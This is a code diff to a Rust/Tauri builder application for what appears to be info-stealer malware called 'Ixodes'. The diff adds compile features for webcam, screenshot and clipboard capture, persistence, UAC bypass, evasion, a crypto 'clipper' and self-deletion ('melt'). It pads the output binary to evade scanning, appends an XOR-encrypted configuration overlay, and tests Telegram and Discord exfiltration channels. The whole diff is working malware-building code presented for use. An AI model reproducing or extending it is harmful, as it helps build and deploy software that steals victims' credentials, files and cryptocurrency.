@@ -105,6 +105,7 @@ struct BuildRequest {
     settings: RecoverySettings,
     branding: Option<BrandingSettings>,
     output_dir: Option<String>,
+    fast_build: bool,
 }
 
 fn ixodes_root() -> Result<PathBuf, String> {
@@ -169,80 +170,125 @@ async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResu
 }
 
 fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
+    println!("Starting build_ixodes_sync...");
     let ixodes_root = ixodes_root()?;
-    
-    // We no longer modify defaults.rs.
-    // Instead, we build the "template" binary and patch it.
-
-    let mut command = Command::new("cargo");
-    command
-        .arg("build")
-        .arg("--release")
-        .current_dir(&ixodes_root)
-        // Pass necessary ENV vars that might be required for build.rs logic, if any.
-        // Assuming password is still baked in? If possible, move to dynamic config too.
-        // For now, keeping password as env var if it's used in build.rs for zip encryption.
-        .env(
-            "IXODES_PASSWORD",
-            request.settings.archive_password.as_deref().unwrap_or(""),
-        );
-
-    if let Some(branding) = request.branding.as_ref() {
-        apply_branding_env(&app, &mut command, branding)?;
-    }
-
-    let output = command
-        .output()
-        .map_err(|err| format!("failed to start cargo build: {err}"))?;
-
-    let mut combined = String::new();
-    combined.push_str(&String::from_utf8_lossy(&output.stdout));
-    if !output.stderr.is_empty() {
-        if !combined.ends_with('\n') {
-            combined.push('\n');
-        }
-        combined.push_str(&String::from_utf8_lossy(&output.stderr));
-    }
-
-    if !output.status.success() {
-        return Ok(BuildResult {
-            success: false,
-            output: combined.trim().to_string(),
-            exe_path: None,
-            moved_to: None,
-        });
-    }
-
     let exe_name = if cfg!(windows) {
         "ixodes.exe"
     } else {
         "ixodes"
     };
-    let exe_path = ixodes_root.join("target").join("release").join(exe_name);
-    if !exe_path.exists() {
+    let template_path = ixodes_root.join("target").join("release").join(exe_name);
+    
+    let mut combined = String::new();
+
+    // 1. Build Template Binary (if not fast build)
+    if request.fast_build {
+        if !template_path.exists() {
+            return Err("Fast build requested but no existing binary found. Run a full build first.".into());
+        }
+        combined.push_str("Skipping compilation (Fast Build selected).\nUsing existing binary.\n");
+    } else {
+        let mut command = Command::new("cargo");
+        command
+            .arg("build")
+            .arg("--release")
+            .arg("--no-default-features");
+
+        let mut features = Vec::new();
+        if request.settings.capture_webcams.unwrap_or(false) { features.push("webcam"); }
+        if request.settings.capture_screenshots.unwrap_or(false) { features.push("screenshot"); }
+        if request.settings.capture_clipboard.unwrap_or(false) { features.push("clipboard"); }
+        if request.settings.persistence.unwrap_or(false) { features.push("persistence"); }
+        if request.settings.uac_bypass.unwrap_or(false) { features.push("uac"); }
+        if request.settings.evasion.unwrap_or(false) { features.push("evasion"); }
+        if request.settings.clipper.unwrap_or(false) { features.push("clipper"); }
+        if request.settings.melt.unwrap_or(false) { features.push("melt"); }
+
+        println!("Features to enable: {:?}", features);
+
+        if !features.is_empty() {
+            command.arg("--features").arg(features.join(" "));
+        }
+
+        command
+            .current_dir(&ixodes_root)
+            .env(
+                "IXODES_PASSWORD",
+                request.settings.archive_password.as_deref().unwrap_or(""),
+            );
+
+        if let Some(branding) = request.branding.as_ref() {
+            apply_branding_env(&app, &mut command, branding)?;
+        }
+
+        println!("Executing cargo command...");
+        let output = command
+            .output()
+            .map_err(|err| format!("failed to start cargo build: {err}"))?;
+        
+        println!("Cargo command finished. Status: {}", output.status);
+        println!("Stdout len: {}, Stderr len: {}", output.stdout.len(), output.stderr.len());
+
+        combined.push_str(&String::from_utf8_lossy(&output.stdout));
+        if !output.stderr.is_empty() {
+            if !combined.ends_with('\n') {
+                combined.push('\n');
+            }
+            combined.push_str(&String::from_utf8_lossy(&output.stderr));
+        }
+
+        if !output.status.success() {
+            println!("Build failed. Output captured: {}", combined.trim());
+            return Ok(BuildResult {
+                success: false,
+                output: combined.trim().to_string(),
+                exe_path: None,
+                moved_to: None,
+            });
+        }
+    }
+
+    if !template_path.exists() {
         return Ok(BuildResult {
             success: false,
             output: format!(
                 "{}\nexpected executable not found: {}",
                 combined.trim(),
-                exe_path.display()
+                template_path.display()
             ),
             exe_path: None,
             moved_to: None,
         });
     }
 
-    // 2. Read Compiled Binary
-    let mut binary_data = fs::read(&exe_path)
-        .map_err(|err| format!("failed to read template binary: {err}"))?;
-
-    // 3. Pump Binary (if requested)
-    if let Some(pump_mb) = request.settings.pump_size_mb {
-        if pump_mb > 0 {
-            pump_binary_data(&mut binary_data, pump_mb);
-            combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
+    // 2. Determine Output Path
+    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
+        if output_dir.is_empty() {
+            None
+        } else {
+            let output_path = PathBuf::from(output_dir);
+            if output_path.extension().is_some() {
+                Some(output_path)
+            } else {
+                let _ = fs::create_dir_all(&output_path);
+                Some(output_path.join(exe_name))
+            }
         }
-    }
+    } else {
+        None
+    };
+
+    let moved_to = moved_to.unwrap_or_else(|| {
+        std::env::var("USERPROFILE")
+            .map(PathBuf::from)
+            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
+            .map(|home| home.join("Desktop").join(exe_name))
+            .unwrap_or_else(|_| PathBuf::from(exe_name))
+    });
+
+    // 3. Copy Template to Output
+    fs::copy(&template_path, &moved_to)
+        .map_err(|err| format!("failed to copy binary to output: {err}"))?;
 
     // 4. Create Payload Config
     let config = PayloadConfig {
@@ -280,56 +326,76 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         custom_keywords: request.settings.custom_keywords.as_ref().map(|v| v.iter().cloned().collect()),
     };
 
-    // 5. Serialize, Encrypt, and Append
+    // 5. Serialize and Encrypt Config
     let config_json = serde_json::to_string(&config)
         .map_err(|err| format!("failed to serialize config: {err}"))?;
+
+    // Generate dynamic key
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    let mut key = [0u8; 32];
+    rng.fill(&mut key);
     
-    let encrypted_config = xor_codec(config_json.as_bytes());
+    let encrypted_config = xor_codec(config_json.as_bytes(), &key);
 
-    let delimiter = "::IXODES_CONFIG::";
-    binary_data.extend_from_slice(delimiter.as_bytes());
-    binary_data.extend_from_slice(&encrypted_config);
+    // Payload = [Key (32)] + [Encrypted Config]
+    let mut payload = Vec::with_capacity(key.len() + encrypted_config.len());
+    payload.extend_from_slice(&key);
+    payload.extend_from_slice(&encrypted_config);
 
-    // 6. Write to Destination
-    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
-        if output_dir.is_empty() {
-            None
-        } else {
-            let output_path = PathBuf::from(output_dir);
-            if output_path.extension().is_some() {
-                Some(output_path)
-            } else {
-                let _ = fs::create_dir_all(&output_path);
-                Some(output_path.join(exe_name))
-            }
-        }
-    } else {
-        None
-    };
-
-    let moved_to = moved_to.unwrap_or_else(|| {
-        std::env::var("USERPROFILE")
-            .map(PathBuf::from)
-            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
-            .map(|home| home.join("Desktop").join(exe_name))
-            .unwrap_or_else(|_| PathBuf::from(exe_name))
-    });
-
-    // Write final patched binary
-    fs::write(&moved_to, &binary_data)
-        .map_err(|err| format!("failed to write final binary to {}: {}", moved_to.display(), err))?;
+    // 6. Inject Resources (Config + Pump)
+    inject_resources(&moved_to, &payload, request.settings.pump_size_mb)?;
 
     Ok(BuildResult {
         success: true,
         output: combined.trim().to_string(),
-        exe_path: Some(exe_path.to_string_lossy().to_string()),
+        exe_path: Some(template_path.to_string_lossy().to_string()),
         moved_to: Some(moved_to.to_string_lossy().to_string()),
     })
 }
 
-fn xor_codec(data: &[u8]) -> Vec<u8> {
-    let key = b"9e2b4cb38d6890f845a7593430292211"; // Static 32-byte key
+fn inject_resources(exe_path: &Path, config: &[u8], pump_size_mb: Option<u32>) -> Result<(), String> {
+    use std::io::Write;
+
+    let mut file = fs::OpenOptions::new()
+        .write(true)
+        .append(true)
+        .open(exe_path)
+        .map_err(|e| format!("failed to open exe for appending: {}", e))?;
+
+    // 1. Pump (Optional)
+    if let Some(mb) = pump_size_mb {
+        if mb > 0 {
+            let size = (mb as usize) * 1024 * 1024;
+            // Write in chunks to avoid massive memory allocation
+            let chunk_size = 1024 * 1024; // 1MB chunks
+            let zeros = vec![0u8; chunk_size];
+            for _ in 0..mb {
+                file.write_all(&zeros).map_err(|e| format!("failed to write pump data: {}", e))?;
+            }
+        }
+    }
+
+    // 2. Config Overlay
+    // Format: [Payload] + [Size(u32)] + [Magic(8)]
+    
+    // Write Payload
+    file.write_all(config).map_err(|e| format!("failed to write config payload: {}", e))?;
+
+    // Write Size
+    let size = config.len() as u32;
+    file.write_all(&size.to_le_bytes()).map_err(|e| format!("failed to write payload size: {}", e))?;
+
+    // Write Magic "IXOD_CFG"
+    file.write_all(b"IXOD_CFG").map_err(|e| format!("failed to write magic marker: {}", e))?;
+
+    Ok(())
+}
+
+fn xor_codec(data: &[u8], key: &[u8]) -> Vec<u8> {
     let mut output = data.to_vec();
+    if key.is_empty() { return output; }
+    
     for (i, byte) in output.iter_mut().enumerate() {
         *byte ^= key[i % key.len()];
     }
@@ -380,26 +446,6 @@ fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
     if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
         command.env(key, value);
     }
-}
-
-fn pump_binary_data(data: &mut Vec<u8>, target_mb: u32) {
-    use rand::Rng;
-    
-    let target_size = (target_mb as u64) * 1024 * 1024;
-    let current_size = data.len() as u64;
-
-    if current_size >= target_size {
-        return;
-    }
-
-    let needed = (target_size - current_size) as usize;
-    let mut rng = rand::thread_rng();
-    let mut buffer = vec![0u8; needed];
-
-    // Simple randomization
-    rng.fill(&mut buffer[..]);
-    
-    data.extend_from_slice(&buffer);
 }
 
 fn resolve_icon_path(
@@ -630,12 +676,61 @@ fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str) -> Result<PathBuf, 
     Ok(path)
 }
 
+#[tauri::command]
+async fn test_telegram_connection(token: String, chat_id: String) -> Result<String, String> {
+    tauri::async_runtime::spawn_blocking(move || {
+        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
+        let client = reqwest::blocking::Client::new();
+        let payload = serde_json::json!({
+            "chat_id": chat_id,
+            "text": "🔔 Ixodes Builder: Connection Test Successful!"
+        });
+
+        let response = client.post(&url)
+            .json(&payload)
+            .send()
+            .map_err(|e| format!("Request failed: {}", e))?;
+
+        if response.status().is_success() {
+            Ok("Connection successful".to_string())
+        } else {
+            Err(format!("Telegram API error: {}", response.status()))
+        }
+    }).await.map_err(|e| format!("Task failed: {}", e))?
+}
+
+#[tauri::command]
+async fn test_discord_connection(webhook: String) -> Result<String, String> {
+    tauri::async_runtime::spawn_blocking(move || {
+        let client = reqwest::blocking::Client::new();
+        let payload = serde_json::json!({
+            "content": "🔔 Ixodes Builder: Connection Test Successful!"
+        });
+
+        let response = client.post(&webhook)
+            .json(&payload)
+            .send()
+            .map_err(|e| format!("Request failed: {}", e))?;
+
+        if response.status().is_success() {
+            Ok("Connection successful".to_string())
+        } else {
+            Err(format!("Discord API error: {}", response.status()))
+        }
+    }).await.map_err(|e| format!("Task failed: {}", e))?
+}
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_opener::init())
         .plugin(tauri_plugin_dialog::init())
-        .invoke_handler(tauri::generate_handler![list_settings_files, build_ixodes])
+        .invoke_handler(tauri::generate_handler![
+            list_settings_files, 
+            build_ixodes,
+            test_telegram_connection,
+            test_discord_connection
+        ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
 }
